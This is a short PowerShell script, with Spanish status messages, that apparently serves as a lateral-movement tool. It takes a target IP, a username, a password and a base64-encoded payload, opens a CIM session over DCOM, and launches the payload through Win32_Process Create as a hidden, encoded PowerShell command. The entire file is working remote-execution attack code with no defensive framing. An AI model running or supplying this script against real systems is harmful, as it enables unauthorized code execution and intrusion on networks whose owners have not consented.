param(
    [string]$TargetIP,
    [string]$Username,
    [string]$Password,
    [string]$PayloadBase64,
    [int]$Port = 443
)

Write-Host "[*] Generando credenciales..."
$secPassword = ConvertTo-SecureString $Password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($Username, $secPassword)

Write-Host "[*] Estableciendo sesión CIM con $TargetIP ..."
$opt = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName $TargetIP -Credential $cred -SessionOption $opt

if ($session) {
    Write-Host "[+] Sesión establecida con $TargetIP. Ejecutando payload..."
    $cmd = "powershell -nop -w hidden -e $PayloadBase64"
    $result = Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $cmd}

    if ($result.ReturnValue -eq 0) {
        Write-Host "[+] Payload ejecutado exitosamente en $TargetIP (PID $($result.ProcessId))"
    } else {
        Write-Warning "[-] Error al ejecutar payload. Código de retorno: $($result.ReturnValue)"
    }

    Remove-CimSession -CimSession $session
} else {
    Write-Warning "[-] No se pudo establecer la sesión CIM con $TargetIP"
}
